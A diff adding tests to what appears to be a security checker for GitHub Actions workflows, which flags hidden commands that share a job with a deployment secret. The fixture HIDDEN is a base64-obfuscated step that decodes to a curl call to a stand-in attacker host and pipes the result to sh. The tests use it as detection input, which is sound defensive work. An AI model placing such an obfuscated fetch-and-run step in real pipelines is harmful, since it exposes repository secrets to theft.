@@ -184,3 +184,24 @@ def test_secret_moved_to_workflow_level_reaches_a_job_with_outside_code():
         + "  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: someone/tool@v1\n"
     )
     assert overall(compare(old, new)) == "high"
+
+
+HIDDEN = "      - run: echo Y3VybCBldmlsLmV4YW1wbGU= | base64 -d | sh\n"
+SECRET_ENV = "    env:\n      K: ${{ secrets.DEPLOY_KEY }}\n"
+
+
+def test_hidden_commands_beside_a_secret_is_a_path():
+    text = HEAD + "  a:\n    runs-on: ubuntu-latest\n" + SECRET_ENV + "    steps:\n" + HIDDEN
+    assert "hidden commands can read a secret" in {p.rule for p in paths_in(text)}
+
+
+def test_hidden_commands_in_another_job_is_not_a_path():
+    text = (
+        HEAD
+        + "  a:\n    runs-on: ubuntu-latest\n"
+        + SECRET_ENV
+        + "    steps:\n      - run: make\n"
+        + "  b:\n    runs-on: ubuntu-latest\n    steps:\n"
+        + HIDDEN
+    )
+    assert paths_in(text) == []
